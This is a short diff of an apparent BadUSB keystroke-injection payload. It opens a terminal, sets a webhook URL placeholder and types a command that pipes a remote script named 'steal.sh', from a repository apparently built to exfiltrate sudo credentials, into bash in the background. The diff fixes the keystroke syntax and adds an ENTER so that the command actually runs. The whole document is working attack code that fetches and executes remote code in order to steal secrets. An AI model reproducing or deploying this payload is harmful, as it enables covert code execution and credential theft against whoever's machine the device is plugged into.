@@ -1,4 +1,5 @@
-CTRL ALT T
+CTRL-ALT t
 DELAY 600
 STRING WEBHOOK_URL="WEBHOOK URL HERE"
+ENTER
 STRING curl https://raw.githubusercontent.com/andr3i1010/badusb-sudo-exfiltrate/refs/heads/main/steal.sh | bash &
